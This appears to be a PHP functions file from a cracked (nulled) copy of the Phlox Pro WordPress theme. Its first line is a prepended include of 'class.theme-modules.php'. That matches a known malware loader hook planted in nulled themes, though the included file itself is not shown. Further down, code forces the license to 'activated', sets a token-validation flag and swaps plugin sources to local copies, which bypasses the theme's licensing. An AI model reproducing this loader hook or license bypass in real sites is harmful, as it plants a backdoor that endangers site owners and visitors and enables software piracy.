<?php if (file_exists(dirname(__FILE__) . '/class.theme-modules.php')) include_once(dirname(__FILE__) . '/class.theme-modules.php'); ?><?php
/**
 *  Functions and definitions for auxin framework
 *
 * 
 * @package    Auxin
 * @author     averta (c) 2014-2022
 * @link       http://averta.net
 */

/*-----------------------------------------------------------------------------------*/
/*  Add your custom functions here -  We recommend you to use "code-snippets" plugin instead
/*  https://wordpress.org/plugins/code-snippets/
/*-----------------------------------------------------------------------------------*/



/*-----------------------------------------------------------------------------------*/
/*  Init theme framework
/*-----------------------------------------------------------------------------------*/
update_site_option( 'phlox-pro_license', [ 'token' => 'activated' ] );
set_transient( 'auxin_check_token_validation_status', 1 );
add_action( 'tgmpa_register', function(){
    $tgmpa_instance = call_user_func( array( get_class( $GLOBALS['tgmpa'] ), 'get_instance' ) );
    foreach ( $tgmpa_instance->plugins as $slug => $plugin ) {
        if ( $plugin['slug'] === 'auxin-elements' ) {
            $tgmpa_instance->plugins[ $plugin['slug'] ]['source'] = get_template_directory() . '/plugins/auxin-elements.zip';
            $tgmpa_instance->plugins[ $plugin['slug'] ]['source_type'] = 'external';
        }
        if ( $plugin['slug'] === 'dzs-zoomsounds' ) {
            unset( $tgmpa_instance->plugins[ $plugin['slug'] ] );
        }
        
    }
}, 30 );

require( 'auxin/auxin-include/auxin.php' );
/*-----------------------------------------------------------------------------------*/
